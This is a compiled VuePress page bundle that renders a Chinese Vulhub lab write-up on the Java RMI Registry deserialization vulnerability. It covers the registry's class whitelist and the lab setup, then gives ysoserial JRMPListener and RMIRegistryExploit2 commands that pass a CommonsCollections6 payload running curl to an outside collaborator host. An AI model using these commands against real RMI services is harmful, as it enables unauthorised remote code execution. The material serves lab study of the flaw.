import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as l,a as n,b as s,d as t,e as a}from"./app-58e4a7d6.js";const i={},r=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Java Remote Method Invocation 用于在 Java 中进行远程调用。RMI 存在远程 bind 的功能 (虽然大多数情况不允许远程 bind)，在 bind 过程中，伪造 Registry 接收到的序列化数据 (实现了 Remote 接口或动态代理了实现了 Remote 接口的对象)，使 Registry 在对数据进行反序列化时触发相应的利用链 (环境用的是 commons-collections:3.2.1).</p><p>自 jdk8u121 起，Registry 对反序列化的类做了白名单限制</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">==</span> clazz
        <span class="token operator">||</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Number</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
        <span class="token operator">||</span> <span class="token class-name">Remote</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
        <span class="token operator">||</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span>Proxy</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
        <span class="token operator">||</span> <span class="token class-name">UnicastRef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
        <span class="token operator">||</span> <span class="token class-name">RMIClientSocketFactory</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
        <span class="token operator">||</span> <span class="token class-name">RMIServerSocketFactory</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
        <span class="token operator">||</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>activation<span class="token punctuation">.</span></span>ActivationID</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span>
        <span class="token operator">||</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span><span class="token constant">UID</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token class-name">ObjectInputFilter<span class="token punctuation">.</span>Status</span><span class="token punctuation">.</span><span class="token constant">ALLOWED</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token class-name">ObjectInputFilter<span class="token punctuation">.</span>Status</span><span class="token punctuation">.</span><span class="token constant">REJECTED</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,4),u={href:"http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/",target:"_blank",rel:"noopener noreferrer"},k=a(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令编译及启动 RMI Registry 和服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose run -e RMIIP=your-ip -p 1099:1099 rmi
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>其中，<code>your-ip</code> 是服务器 IP，客户端会根据这个 IP 来连接服务器。</p><p>环境启动后，RMI Registry 监听在 1099 端口。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,6),d={href:"https://github.com/wh1t3p1g/ysoserial",target:"_blank",rel:"noopener noreferrer"},m=a(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>// 开启JRMPListener
<span class="token function">java</span> <span class="token parameter variable">-cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener <span class="token number">8888</span> CommonsCollections6 <span class="token string">&quot;curl http://xxxxx.burpcollaborator.net&quot;</span>
// 发起攻击
<span class="token function">java</span> <span class="token parameter variable">-cp</span> target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 <span class="token number">192.168</span>.31.88 <span class="token number">1099</span> jrmphost <span class="token number">8888</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20200206135822418.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>Registry 会返回报错，这个没关系正常，命令会正常执行。</p>`,3);function v(b,g){const e=o("ExternalLinkIcon");return c(),l("div",null,[r,n("p",null,[s("我们需要在上面的几个白名单里面找到相应的可利用的类 具体原理见 "),n("a",u,[s("浅谈RMI Registry反序列化问题"),t(e)])]),k,n("p",null,[s("通过 "),n("a",d,[s("ysoserial"),t(e)]),s(" 的 exploit 包中的 RMIRegistryExploit2 或者 3 进行攻击")]),m])}const y=p(i,[["render",v],["__file","Java RMI Registry 反序列化漏洞(jdk8u232_b09).html.vue"]]);export{y as default};
